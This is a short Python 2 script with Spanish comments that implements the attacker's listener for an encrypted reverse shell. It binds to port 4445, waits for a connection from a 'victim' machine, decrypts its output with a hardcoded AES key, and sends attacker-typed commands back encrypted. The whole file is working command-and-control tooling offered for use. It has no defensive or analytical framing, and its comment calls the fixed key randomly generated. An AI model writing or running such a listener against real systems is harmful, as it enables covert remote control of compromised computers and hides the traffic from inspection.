#!/usr/bin/python

from Crypto.Cipher import AES
import socket
import base64
import os


EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))

# se genera una clave secreta aleatoria
secret = "HUISA78sa9y&9syYSsJhsjkdjklfs9aR"

# se crea un objeto AES usando la clave secreta aleatoria
cipher = AES.new(secret,AES.MODE_CFB)

# se cifra y codifica una cadena
# encoded = EncodeAES(cipher, 'password')
# print 'Cadena cifrada:', encoded

# Se descifra y decodifica una cadena
# decoded = DecodeAES(cipher, encoded)
# print 'Cadena descifirada:', decoded

c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.bind(('0.0.0.0', 4445))
c.listen(1)
s,a = c.accept()

while True:
	# Se reciben datos cifrados de la victima
	data = s.recv(1024)
	
	# Se descifran los datos recibidos
	descifrado = DecodeAES(cipher, data)
	
	# Se comprueba si los datos recibidos descifrados terminan con la marca EOF
	if descifrado.endswith("EOF") == True:
		
		# Se muestran los datos sin la marca EOF
		print descifrado[:-3]

		if descifrado.startswith("salir") == True:
                        print "Conexion finalizada. Bye White Rabbit"
                        break
		
		# Se pide al atacante que introduzca el siguiente comando
		nextcmd = raw_input("[shell]: ")
		
		# Se cifra el comando introducido
		encrypted = EncodeAES(cipher, nextcmd)
		
		# Se envia el comando cifrado
		s.send(encrypted)
		
	else:
		print descifrado
